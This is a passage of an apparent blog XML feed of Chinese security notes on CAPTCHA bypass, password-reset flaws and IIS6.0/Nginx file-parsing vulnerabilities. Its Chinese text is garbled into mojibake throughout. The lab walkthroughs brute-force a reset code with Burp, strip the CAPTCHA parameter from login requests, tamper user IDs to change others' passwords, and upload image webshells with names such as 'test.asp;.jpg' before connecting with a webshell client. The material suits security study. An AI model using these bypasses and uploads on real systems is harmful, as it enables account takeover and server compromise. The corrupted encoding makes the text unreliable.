href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution</a></p><p>CTF Writeup: Complex Drupal POP Chainï¼š</p><p><a href="https://blog.ripstech.com/2019/complex-drupal-pop-chain" target="_blank" rel="noopener">https://blog.ripstech.com/2019/complex-drupal-pop-chain</a></p><p>æœ¬æ–‡ç¿»è¯‘è‡ª blog.ripstech.comï¼Œ åŸæ–‡é“¾æ¥ ã€‚å¦‚è‹¥è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>éªŒè¯ç ç»•è¿‡ã€å¯†ç æ‰¾å›æ¼æ´</title>
      <link href="/2019/12/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="éªŒè¯ç ä½œç”¨"><a href="#éªŒè¯ç ä½œç”¨" class="headerlink" title="éªŒè¯ç ä½œç”¨"></a>éªŒè¯ç ä½œç”¨</h2><p>éªŒè¯ç ï¼ˆCAPTCHAï¼‰æ˜¯â€œCompletely Automated Public Turing test to tell Computers and Humans Apartâ€ï¼ˆå…¨è‡ªåŠ¨åŒºåˆ†è®¡ç®—æœºå’Œäººç±»çš„å›¾çµæµ‹è¯•ï¼‰çš„ç¼©å†™ï¼Œæ˜¯ä¸€ç§åŒºåˆ†ç”¨æˆ·æ˜¯è®¡ç®—æœºè¿˜æ˜¯äººçš„å…¬å…±å…¨è‡ªåŠ¨ç¨‹åºã€‚</p><p>å¯ä»¥é˜²æ­¢ï¼šæ¶æ„ç ´è§£å¯†ç ã€åˆ·ç¥¨ã€è®ºå›çŒæ°´ï¼Œæœ‰æ•ˆé˜²æ­¢æŸä¸ªé»‘å®¢å¯¹æŸä¸€ä¸ªç‰¹å®šæ³¨å†Œç”¨æˆ·ç”¨ç‰¹å®šç¨‹åºæš´åŠ›ç ´è§£æ–¹å¼è¿›è¡Œä¸æ–­çš„ç™»é™†å°è¯•ï¼Œå®é™…ä¸Šç”¨éªŒè¯ç æ˜¯ç°åœ¨å¾ˆå¤šç½‘ç«™é€šè¡Œçš„æ–¹å¼ï¼Œæˆ‘ä»¬åˆ©ç”¨æ¯”è¾ƒç®€æ˜“çš„æ–¹å¼å®ç°äº†è¿™ä¸ªåŠŸèƒ½ã€‚è¿™ä¸ªé—®é¢˜å¯ä»¥ç”±è®¡ç®—æœºç”Ÿæˆå¹¶è¯„åˆ¤ï¼Œä½†æ˜¯å¿…é¡»åªæœ‰äººç±»æ‰èƒ½è§£ç­”ã€‚</p><p>ç”±äºè®¡ç®—æœºæ— æ³•è§£ç­”CAPTCHAçš„é—®é¢˜ï¼Œæ‰€ä»¥å›ç­”å‡ºé—®é¢˜çš„ç”¨æˆ·å°±å¯ä»¥è¢«è®¤ä¸ºæ˜¯äººç±»ã€‚</p><p>éªŒè¯ç çš„ç§ç±»å¾ˆå¤šï¼Œæœ‰æ»‘å—éªŒè¯ï¼Œçº¯æ•°å­—éªŒè¯ï¼Œç‚¹å‡»å­—ç¬¦ï¼Œæ•°å­—è¿ç®—ç­‰â€¦â€¦<br>è€Œæˆ‘ä»¬èƒ½æœ‰æ•ˆçš„åˆ©ç”¨éªŒè¯ç é˜²æ­¢æ¶æ„ç ´è§£å¯†ç ã€åˆ·ç¥¨ã€è®ºå›çŒæ°´ã€åˆ·é¡µã€‚</p><h2 id="éªŒè¯ç å¸¸è§çš„ç»•è¿‡å§¿åŠ¿"><a href="#éªŒè¯ç å¸¸è§çš„ç»•è¿‡å§¿åŠ¿" class="headerlink" title="éªŒè¯ç å¸¸è§çš„ç»•è¿‡å§¿åŠ¿"></a>éªŒè¯ç å¸¸è§çš„ç»•è¿‡å§¿åŠ¿</h2><h3 id="éªŒè¯ç ä¸å¤±æ•ˆ"><a href="#éªŒè¯ç ä¸å¤±æ•ˆ" class="headerlink" title="éªŒè¯ç ä¸å¤±æ•ˆ"></a>éªŒè¯ç ä¸å¤±æ•ˆ</h3><ul><li>é€ æˆåŸå› ï¼šæ‰¾å›å¯†ç çš„æ—¶å€™è·å–çš„éªŒè¯ç ç¼ºå°‘æ—¶é—´é™åˆ¶ä»…å€¼åˆ¤æ–­äº†éªŒè¯ç æ˜¯å¤Ÿæ­£ç¡®æœªåˆ¤æ–­éªŒè¯ç æ˜¯å¦è¿‡æœŸã€‚</li><li>æµ‹è¯•æ–¹æ³•ï¼šé€šè¿‡æšä¸¾æ‰¾åˆ°çœŸæ­£çš„éªŒè¯ç è¾“å…¥éªŒè¯ç å®ŒæˆéªŒè¯ã€‚</li></ul><p>###éªŒè¯ç é‡å¤ä½¿ç”¨<br>éªŒè¯ç å¯ä»¥å¤šæ¬¡é‡å¤ï¼Œå¦‚æœç°åœ¨çš„éªŒè¯ç ä¸º1106ï¼Œå¦‚æœç™»å½•å¤±äº†ï¼ŒéªŒè¯ç ä¼šæ¢ä½†æ˜¯è¾“å…¥1106ï¼Œè¿˜æ˜¯åˆ¤å®šéªŒè¯ç æ­£ç¡®ï¼›<a href="http://www.anquan.us/static/bugs/wooyun-2016-0169672.html" target="_blank" rel="noopener">æ¡ˆä¾‹</a></p><h3 id="æœªæ ¡éªŒç”¨æˆ·å­—æ®µçš„å€¼"><a href="#æœªæ ¡éªŒç”¨æˆ·å­—æ®µçš„å€¼" class="headerlink" title="æœªæ ¡éªŒç”¨æˆ·å­—æ®µçš„å€¼"></a>æœªæ ¡éªŒç”¨æˆ·å­—æ®µçš„å€¼</h3><ul><li>é€ æˆåŸå› ï¼šåœ¨æ•´ä¸ªé‡ç½®å¯†ç çš„æµç¨‹ä¸­ï¼Œåªå¯¹éªŒè¯ç å’Œæ‰‹æœºå·åšäº†æ ¡éªŒï¼Œæœªå¯¹åé¢è®¾ç½®æ–°å¯†ç çš„ç”¨æˆ·èº«ä»½åšåˆ¤æ–­ï¼Œå¯¼è‡´åœ¨æœ€åä¸€æ­¥é€šè¿‡ä¿®æ”¹ç”¨æˆ·èº«ä»½æ¥é‡ç½®ä»–äººçš„å¯†ç ã€‚</li><li>æµ‹è¯•æ–¹æ³•ï¼šä½¿ç”¨è‡ªå·±çš„æ‰‹æœºå·èµ°æµç¨‹ï¼Œåœ¨èµ°åˆ°æœ€åä¸€ä¸ªè®¾ç½®å¯†ç çš„æµç¨‹æ—¶ï¼Œä¿®æ”¹æ•°æ®åŒ…é‡Œçš„ç”¨æˆ·ä¿¡æ¯ã€‚<h3 id="å‰ç«¯éªŒè¯éªŒè¯ç "><a href="#å‰ç«¯éªŒè¯éªŒè¯ç " class="headerlink" title="å‰ç«¯éªŒè¯éªŒè¯ç "></a>å‰ç«¯éªŒè¯éªŒè¯ç </h3></li><li>é€ æˆåŸå› ï¼šåªåœ¨å‰ç«¯è¿›è¡ŒéªŒè¯æ²¡æœ‰è¿›è¡Œåç«¯éªŒè¯</li><li>æµ‹è¯•æ–¹æ³•ï¼šç›´æ¥æŠ“åŒ…è¿›è¡Œè·‘æ•°æ®åŒ…ï¼Œåæ­£æ²¡éªŒè¯ç çš„é˜»ç¢ã€‚<h3 id="ä¿®æ”¹å¯†ç å¤„idå¯æ›¿æ¢"><a href="#ä¿®æ”¹å¯†ç å¤„idå¯æ›¿æ¢" class="headerlink" title="ä¿®æ”¹å¯†ç å¤„idå¯æ›¿æ¢"></a>ä¿®æ”¹å¯†ç å¤„idå¯æ›¿æ¢</h3></li><li>é€ æˆåŸå› ï¼šä¿®æ”¹å¯†ç çš„æ—¶å€™ï¼Œæ²¡æœ‰å¯¹åŸå¯†ç è¿›è¡Œåˆ¤æ–­ï¼Œä¸”æ ¹æ®idçš„å€¼æ¥ä¿®æ”¹ç”¨æˆ·çš„å¯†ç ï¼Œç±»ä¼¼çš„SQLè¯­å¥ï¼šupdate user set  password=â€qwer1234â€ where id = â€˜1â€™ä¿®æ”¹æ•°æ®åŒ…é‡Œçš„idçš„å€¼ï¼Œå³å¯ä¿®æ”¹ä»–äººå¯†ç ã€‚</li><li>æµ‹è¯•æ–¹æ³•ï¼šä¿®æ”¹è‡ªå·±ç”¨æˆ·å¯†ç ï¼ŒæŠ“å–æ•°æ®åŒ…ï¼Œæ›¿æ¢æ•°æ®åŒ…ä¸­ç”¨æˆ·å¯¹åº”çš„idå€¼ï¼Œå³å¯ä¿®æ”¹ä»–äººçš„å¯†ç ã€‚<h3 id="éªŒè¯ç æ— æ ¡éªŒ"><a href="#éªŒè¯ç æ— æ ¡éªŒ" class="headerlink" title="éªŒè¯ç æ— æ ¡éªŒ"></a>éªŒè¯ç æ— æ ¡éªŒ</h3></li><li>é€ æˆåŸå› ï¼šè®¾ç½®äº†éªŒè¯ç ï¼Œä½†å´æ²¡æœ‰æ ¡éªŒ(çœŸæ˜¯æ‰¯æ·¡â€¦â€¦ä¼°è®¡å¼€å‘ä¼šè¢«è€æ¿ç æ­»)</li><li>æµ‹è¯•æ–¹æ³•ï¼šä¹±è¾“éªŒè¯ç è¿›è¡ŒéªŒè¯å³å¯ã€‚<h3 id="éªŒè¯ç ç©ºå€¼ç»•è¿‡"><a href="#éªŒè¯ç ç©ºå€¼ç»•è¿‡" class="headerlink" title="éªŒè¯ç ç©ºå€¼ç»•è¿‡"></a>éªŒè¯ç ç©ºå€¼ç»•è¿‡</h3></li><li>é€ æˆåŸå› ï¼šæ²¡å¯¹éªŒè¯ç å‚æ•°è¿›è¡Œå¼ºåˆ¶æ¡ä»¶ï¼Œå¦‚æˆ‘ä»¬å‘ç°ç™»å½•å‚æ•°æ˜¯user=admin&amp;psw=123456&amp;yzm=1312ï¼Œå°†éªŒè¯ç ä¼ å‚å»æ‰ï¼Œç•™ä¸‹user=admin&amp;psw=123456å°±å¯ä»¥ç»•è¿‡éªŒè¯ç æœºåˆ¶ã€‚</li><li>æµ‹è¯•æ–¹æ³•ï¼šæŠ“åŒ…ï¼Œå¦‚çœ‹åˆ°ç±»ä¼¼éªŒè¯ç å‚æ•°ï¼Œå°†å…¶å»æ‰ï¼Œè¿›è¡Œå‘åŒ…ã€‚<h3 id="éªŒè¯ç å¯æ§åˆ¶"><a href="#éªŒè¯ç å¯æ§åˆ¶" class="headerlink" title="éªŒè¯ç å¯æ§åˆ¶"></a>éªŒè¯ç å¯æ§åˆ¶</h3></li><li>é€ æˆåŸå› ï¼šæœ‰æ—¶å€™éªŒè¯ç é€šè¿‡urlä¼ å‚ï¼Œå°±æ˜¯è¯´æˆ‘ä»¬å‚æ•°å¯æ§ï¼Œè€ŒéªŒè¯ç æ˜¯é€šè¿‡å‚æ•°è®¾å®šçš„ã€‚</li><li>æµ‹è¯•æ–¹æ³•ï¼šç›´æ¥å°†å‚æ•°è®¾ç½®æˆå›ºå®šï¼Œé‚£ä¹ˆå¯èƒ½éªŒè¯ç å°±ä¸ä¼šå˜</li></ul><p><strong>ç»•è¿‡å§¿åŠ¿æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡Œåªæ˜¯ç»™å¤§å®¶ä»‹ç»å‡ ç§ï¼Œèƒ½å¸®åŠ©æ›´å¥½çš„äº†è§£æ­¤æ¼æ´ã€‚</strong></p><h2 id="å¯†ç æ‰¾å›æ¼æ´"><a href="#å¯†ç æ‰¾å›æ¼æ´" class="headerlink" title="å¯†ç æ‰¾å›æ¼æ´"></a>å¯†ç æ‰¾å›æ¼æ´</h2><p>æœ‰ä¸€ç±»éªŒè¯ç ï¼Œä»–å¹¶ä¸æ˜¯åŒºåˆ†ç”¨æˆ·æ˜¯è®¡ç®—æœºè¿˜æ˜¯äººçš„å…¬å…±å…¨è‡ªåŠ¨ç¨‹åºï¼Œå®ƒæ˜¯ç”¨æ¥è¯æ˜ä½ çš„èº«ä»½ï¼Œæ¯”å¦‚ä½ ç™»å…¥å¾®ä¿¡ï¼Œæ”¯ä»˜å®ï¼Œæ”¯æŒçŸ­ä¿¡éªŒè¯ç™»å…¥ï¼Œåƒè¿™ç±»éªŒè¯ç å®é™…ä¸Šæ˜¯ç”¨æ¥åŒºåˆ†ä½ çš„èº«ä»½çš„ã€‚<br>å½“ä½ qqå¯†ç å¿˜è®°å¯†ç æ—¶å€™ï¼Œä½ éœ€è¦æ‰¾å›å¯†ç ï¼Œç„¶åä»–è¦æ±‚æŠŠAPPç°å®çš„åŠ¨æ€å¯†ç å¡«å…¥æ¡†å†…ï¼Œä¸€èˆ¬è€Œè¨€æ‰‹æœºéªŒè¯ç éƒ½ç”±5-30åˆ†é’Ÿï¼Œå¦‚æœä»–æ²¡æœ‰åšå°è¯•é™åˆ¶çš„è¯æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥è¿›è¡Œç©·ä¸¾ï¼Ÿç„¶åç›´æ¥è·‘å‡ºéªŒè¯ç å°±èƒ½ä¿®æ”¹ä»–äººçš„å¯†ç ï¼Ÿ</p><p>ç¬¬ä¸€ç§å°±æ˜¯æ‰¾å›å¯†ç ï¼Œå¾€é‚®ç®±å‘é€æ˜æ–‡æˆ–å¯†ç åè€…éªŒè¯ç (æ‰‹æœºçŸ­ä¿¡éªŒè¯å°±æ˜¯ç©ä½ çš„æ‰‹æœºå‘é€éªŒè¯ç )é€šè¿‡è¿™æ ·çš„æ–¹å¼æ¥åˆ¤æ–­æ˜¯å¦æ˜¯æœ¬äºº</p><p>ç¬¬äºŒç§å‘é€ä¸€ä¸ªé‡ç½®å¯†ç çš„é“¾æ¥åˆ°ä½ çš„ç»‘å®šé‚®ç®±å»ï¼Œç‚¹å‡»åˆ™é‡ç½®å¯†ç ï¼›</p><h3 id="å¯†ç æ‰¾å›æ¼æ´ä¾‹å­"><a href="#å¯†ç æ‰¾å›æ¼æ´ä¾‹å­" class="headerlink" title="å¯†ç æ‰¾å›æ¼æ´ä¾‹å­"></a>å¯†ç æ‰¾å›æ¼æ´ä¾‹å­</h3><ul><li>éªŒè¯ç å‘é€åå‰ç«¯è¿”å›<a href="http://www.anquan.us/static/bugs/wooyun-2016-0172266.html" target="_blank" rel="noopener">å®‰åˆ©</a></li><li>éªŒè¯ç æ— æ¬¡æ•°é™åˆ¶å¯çˆ†ç ´</li><li>éªŒè¯ç å¯æ§<a href="http://www.anquan.us/static/bugs/wooyun-2014-086716.html" target="_blank" rel="noopener">å®‰åˆ©</a></li><li>ç›´æ¥ä¿®æ”¹å¯†ç é¡µé¢<a href="http://www.anquan.us/static/bugs/wooyun-2013-040908.html" target="_blank" rel="noopener">å®‰åˆ©</a></li><li>ç¼ºå¤±èº«ä»½â€”â€”&gt;ç»‘å®šåˆ«äººçš„æ‰‹æœºå·åˆ°è‡ªå·±çš„æ‰‹æœº<a href="http://www.anquan.us/static/bugs/wooyun-2013-016896.html" target="_blank" rel="noopener">å®‰åˆ©</a></li><li>è¶Šæƒæ¼æ´â€”â€”&gt;è‡ªå·±éªŒè¯ç é€šè¿‡æ”¹åŒ…ç„¶åä¿®æ”¹ä»–ä»¬å¯†ç </li></ul><h2 id="é¶åœºå®ä¾‹"><a href="#é¶åœºå®ä¾‹" class="headerlink" title="é¶åœºå®ä¾‹"></a>é¶åœºå®ä¾‹</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbn3k3ewj31h80q37gc.jpg" alt><br>æˆ‘ä»¬çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªåå°ç®¡ç†é¡µé¢ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªå¯†ç æ‰¾å›ï¼Œä»–æ˜¯é€šè¿‡ç®¡ç†å‘˜é‚®ç®±æ¥æ‰¾å›çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¤¾å·¥å’Œç¤¾åŒºå¯»æ‰¾ç®¡ç†å‘˜çš„é‚®ç®±ã€‚</p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å·²ç»æ‰¾åˆ°é‚®ç®±äº†<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbne7ztuj30ir09ddfu.jpg" alt></p><p>æˆ‘ä»¬é€šè¿‡å®¡è®¡ä»£ç å‘ç°è®¤è¯ç æ˜¯åœ¨10-10000çš„éšæœºæ•°ï¼Œé‚£å¦‚æœå®ƒæ²¡æœ‰è¾“å…¥è®¤è¯ç æ¬¡æ•°é™åˆ¶ï¼Œé‚£æˆ‘ä»¬å¯ä¸å¯ä»¥é€šè¿‡çˆ†ç ´æ¥çˆ†å‡ºè®¤è¯ç ã€‚<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3si8n7bwqj30t30i1jxq.jpg" alt><br>æˆ‘ä»¬é€šè¿‡burpæŠ“åŒ…<br>è¿›è¡Œçˆ†ç ´<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbo8p3hxj31gz0q9ah4.jpg" alt></p><p>æˆåŠŸçˆ†ç ´å‡ºè®¤è¯ç <br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbp05856j30kz09jabl.jpg" alt></p><p>æˆ‘ä»¬è¿›è¡Œç™»å½•<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg" alt="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg"><br>å‘ç°ç™»å½•æˆåŠŸ</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ è§£ææ¼æ´â€”â€”è§£æã€éªŒè¯ã€ä¼ªé€ ï¼ˆä¸‰ï¼‰</title>
      <link href="/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E3/"/>
      <url>/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E3/</url>
      
        <content type="html"><![CDATA[<p><strong>æ¥ä¸Šä¸€ç¯‡å†…å®¹</strong></p><h2 id="IIS6-0è§£ææ¼æ´ï¼ˆä¸€ï¼‰"><a href="#IIS6-0è§£ææ¼æ´ï¼ˆä¸€ï¼‰" class="headerlink" title="IIS6.0è§£ææ¼æ´ï¼ˆä¸€ï¼‰"></a>IIS6.0è§£ææ¼æ´ï¼ˆä¸€ï¼‰</h2><p>æˆ‘ä»¬ç°åœ¨è¦è®²çš„ç¬¬ä¸€ä¸ªæ˜¯IIS6.0çš„è§£æé—®é¢˜ï¼š</p><p>iis6.0é™¤äº†å°†ASPåç¼€å½“æˆASPè¿›è¡Œè§£æçš„åŒæ—¶ï¼Œå½“<strong>æ–‡ä»¶åç¼€åå­—ä¸º.asa .cer .cdxä¹Ÿä¼šå½“åšaspå»è§£æ</strong>ï¼Œè€Œä¸¥æ ¼æ„æ€ä¸Šè®²è¿™å¯ä»¥è¯´æ˜¯iis6çš„ä¸€äº›ç‰¹æ€§ï¼Œåªæ˜¯iis6é»˜è®¤çš„ä¸€äº›é»˜è®¤é…ç½®ï¼Œæ–‡ä»¶åç¼€åå­—ä¸º.asa .cer .cdxä¹‹æ‰€ä»¥ä¹Ÿä¼šå½“åšaspå»è§£æï¼Œæ˜¯å› ä¸º<strong>IIS6.0åœ¨åº”ç”¨ç¨‹åºæ‰©å±•ä¸­é»˜è®¤è®¾ç½®äº†.asa .cer .cdxéƒ½ä¼šè°ƒç”¨asp.dllã€‚</strong></p><p>å½“ç„¶ï¼Œå¦‚æœæˆ‘ä»¬åœ¨iis6.0åº”ç”¨ç¨‹åºæ‰©å±•é…ç½®ä¸­æ·»åŠ .allblueè°ƒç”¨asp.dllå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡.allblueåç¼€æ¥å½“æˆaspæ–‡ä»¶æ¥è§£æï¼›</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹é¶åœºï¼š<br><img src="https://s2.ax1x.com/2019/05/23/VPPBQO.png" alt><br>è¿™é“é¢˜ï¼Œæˆ‘ä»¬åªè¦é€šè¿‡ä¸Šä¼ ä¸€å¼ å›¾ç‰‡é©¬ï¼Œå¹¶æŠ“åŒ…å°†åç¼€æ”¹æˆ.asa .cer .cdxå…¶ä¸­ä¸€ç§åç¼€ï¼Œéƒ½ä¼šè¢«å½“æˆaspæ–‡ä»¶æ‰§è¡Œ(è¯·æ³¨æ„ï¼Œæˆ‘ä»¬è¦è§£æçš„æ˜¯aspæ–‡ä»¶,æ‰€ä»¥ä¸€å¥è¯ä¹Ÿè¦æ˜¯aspçš„ï¼›ä¹Ÿä¸èƒ½å†æœ¬åœ°ç›´æ¥æ”¹åç¼€åï¼Œå› ä¸ºè¿™é‡Œä¼šéªŒè¯æ–‡ä»¶çš„æ–‡ä»¶ç±»å‹)</p><p>æˆ‘ä»¬å°†å›¾ç‰‡é©¬ä¸Šä¼ å¹¶æŠ“åŒ…æ”¹åŒ…<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bco51gejj30z40rkjup.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcotohhjj30z40rkwhz.jpg" alt><br>ä¸Šä¼ <br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcp8pj9rj30kn06zmx7.jpg" alt><br>ä¸Šä¼ æˆåŠŸ<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpms01qj31hc05374x.jpg" alt><br>é€šè¿‡èœåˆ€æ–‡ä»¶è¿æ¥<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpzllsuj30zk0jgq4o.jpg" alt></p><h2 id="IIS6-0è§£ææ¼æ´ï¼ˆäºŒï¼‰"><a href="#IIS6-0è§£ææ¼æ´ï¼ˆäºŒï¼‰" class="headerlink" title="IIS6.0è§£ææ¼æ´ï¼ˆäºŒï¼‰"></a>IIS6.0è§£ææ¼æ´ï¼ˆäºŒï¼‰</h2><p>é¦–å…ˆè¯´æ˜ä¸‹,IIS5å’ŒIIS7.5æ— æ­¤æ¼æ´ï¼</p><p>IIS6.0åœ¨å¤„ç†å«æœ‰ç‰¹æ®Šç¬¦å·çš„æ–‡ä»¶è·¯å¾„æ—¶ä¼šå‡ºç°é€»è¾‘é”™è¯¯ï¼Œä»è€Œé€ æˆæ–‡ä»¶è§£ææ¼æ´ï¼Œè¿™ä¸€è§£ææ¼æ´æœ‰ä¸¤ç§å®Œå…¨ä¸åŒçš„åˆ©ç”¨æ–¹å¼ï¼š</p><p>test.asp;.jpg ä¼šè¢«å½“åšaspè¿›è¡Œè§£æ<br>text.asp/123.jpg ä¼šè¢«å½“åšaspè¿›è¡Œè§£æ</p><p>å‡å¦‚æˆ‘ä»¬è¯·æ±‚/aaa.asp;xxxx.jpg<br> æ‰§è¡Œè¿‡ç¨‹ï¼š</p><ol><li><p>ä»å¤´éƒ¨æŸ¥æ‰¾æŸ¥æ‰¾â€œ.â€,è·å¾—.asp;xxxx.jpg</p></li><li><p>æŸ¥æ‰¾â€œ;â€å·ï¼Œå¦‚æœæœ‰åˆ™å†…å­˜æˆªæ–­</p></li><li><p>æŸ¥æ‰¾â€œ/â€å·ï¼Œå¦‚æœæœ‰åˆ™å†…å­˜æˆªæ–­</p></li></ol><p><strong>æœ€ç»ˆï¼Œå°†ä¿ç•™ä¸‹æ¥.aspå­—ç¬¦ä¸²ï¼Œä»META_SCRIPT_MAPè„šæœ¬æ˜ å°„è¡¨é‡Œäºæ‰©å±•ååŒ¹é…å¯¹æ¯”ï¼Œå¹¶åé¦ˆç»™asp.dll</strong><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdy4uguij31320m9tbi.jpg" alt><br>æˆ‘ä»¬å…ˆä¸Šä¼ å›¾ç‰‡é©¬<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdyhs8kfj30z40rkgoy.jpg" alt><br>å¹¶æ”¹åŒ…<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdysx2crj30z40rkq6a.jpg" alt><br>ä¸Šä¼ <br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdz1tirij30d903nmx2.jpg" alt><br>ä¸Šä¼ æˆåŠŸ<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzav54yj31h80600td.jpg" alt><br>é€šè¿‡èœåˆ€æ–‡ä»¶è¿æ¥<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzl1189j30zk0jgwgd.jpg" alt></p><h2 id="IIS6-0è§£ææ¼æ´ï¼ˆä¸‰ï¼‰"><a href="#IIS6-0è§£ææ¼æ´ï¼ˆä¸‰ï¼‰" class="headerlink" title="IIS6.0è§£ææ¼æ´ï¼ˆä¸‰ï¼‰"></a>IIS6.0è§£ææ¼æ´ï¼ˆä¸‰ï¼‰</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj36uy6oj312t0nigog.jpg" alt><br>IIS6.0è¿˜æœ‰ä¸€ä¸ªæ¼æ´ï¼Œåœ¨åç¼€æ˜¯.aspçš„æ–‡ä»¶å¤¹ä¸‹ï¼Œé‡Œé¢çš„æ–‡ä»¶é‡Œåªè¦æœ‰aspä»£ç ï¼Œåªè¦è¿›è¡Œè®¿é—®ï¼Œéƒ½ä¼šå½“åšaspæ–‡ä»¶æ‰§è¡Œï¼›<br>æˆ‘ä»¬å…ˆä¸Šä¼ å›¾ç‰‡çœ‹çœ‹ç›®å½•ï¼š<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj3yblsnj31hb09ewet.jpg" alt><br>æˆ‘å‘ç°ä»–çš„æ–‡ä»¶æ˜¯å­˜æ”¾åœ¨.aspåç¼€æ–‡ä»¶å¤¹ä¸‹ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¸Šä¼ ä¸€å¼ å›¾ç‰‡é©¬ä¸Šå»ç›´æ¥æ¥å½“æˆaspæ–‡ä»¶æ‰§è¡Œå‘¢ï¼Ÿæˆ‘ä»¬è¯•ä¸‹</p><p>ä¸Šä¼ æˆåŠŸ<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjbs3411j31f106nt8q.jpg" alt><br>è®¿é—®æˆåŠŸ<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bje86116j31h204mt9b.jpg" alt></p><p>ç›´æ¥ç”¨èœåˆ€è¿æ¥<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjepq8mqj30zk0jg75h.jpg" alt></p><h2 id="CGIè§£ææ¼æ´"><a href="#CGIè§£ææ¼æ´" class="headerlink" title="CGIè§£ææ¼æ´"></a>CGIè§£ææ¼æ´</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjhl75i1j312z0ms0vg.jpg" alt><br>Nginxé»˜è®¤æ˜¯ä»¥CGIçš„æ–¹å¼æ”¯æŒPHPè§£æçš„ï¼Œæ™®éçš„åšæ³•æ˜¯åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­é€šè¿‡æ­£åˆ™åŒ¹é…è®¾SCRIPT_FILENAME.</p><p>å½“è®¿é—®<a href="http://www.xx.com/phpinfo.jpg/1.phpè¿™ä¸ªURLæ—¶ï¼Œ$fastcgi_script_nameä¼šè¢«è®¾ç½®&quot;phpinfo.jpg/1.php&quot;,ç„¶åæ„é€ SCRIPT_FILENAME(ç»å¯¹è·¯å¾„)ä¼ é€’ç»™PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.phpè¿™ä¸ªURLæ—¶ï¼Œ$fastcgi_script_nameä¼šè¢«è®¾ç½®&quot;phpinfo.jpg/1.php&quot;,ç„¶åæ„é€ SCRIPT_FILENAME(ç»å¯¹è·¯å¾„)ä¼ é€’ç»™PHP</a> CGIï¼Œå¦‚æœå¼€å¯äº†fix_pathinfoé€‰é¡¹ï¼Œnameå°±ä¼šè§¦å‘åœ¨PHPä¸­çš„å¦‚ä¸‹é€»è¾‘ï¼š</p><p>PHPä¼šè®¤ä¸ºSCRIPT_FILENAME(ç»å¯¹è·¯å¾„)æ˜¯phpinfo.jpg,è€Œ1.phpæ˜¯PATH_INFO,æ‰€ä»¥å°±ä¼šphpinfo.jpgä½œä¸ºphpæ–‡ä»¶æ¥è§£æäº†</p><p>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªé€»è¾‘é—®é¢˜ï¼Œæ‰€ä»¥è¯´<strong>æˆ‘ä»¬åªéœ€è¦åœ¨æ­£å¸¸çš„jpgåé¢åŠ /.phpå°±å¯ä»¥æˆåŠŸçš„ç»•è¿‡è§£æ</strong></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ è§£ææ¼æ´-è§£æã€éªŒè¯ã€ä¼ªé€ </title>
